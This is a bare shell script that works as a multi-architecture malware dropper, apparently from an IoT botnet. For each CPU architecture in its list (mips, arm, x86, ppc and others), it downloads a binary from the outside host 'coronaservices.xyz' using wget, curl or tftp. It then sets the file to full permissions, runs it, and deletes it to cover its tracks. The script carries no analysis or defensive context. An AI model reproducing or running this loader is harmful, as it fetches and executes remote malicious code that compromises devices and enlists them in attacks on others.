binarys="mips mipsel x86 arm7 arm4 sh4 arm6 arm5 ppc arc"
server_ip="coronaservices.xyz"
for arch in $binarys
do
rm -rf $arch
wget http://$server_ip/$arch || curl -O http://$server_ip/$arch || tftp $server_ip -c get $arch || tftp -g -r $arch $server_ip
chmod 777 $arch
./$arch $1
rm -rf $arch
done
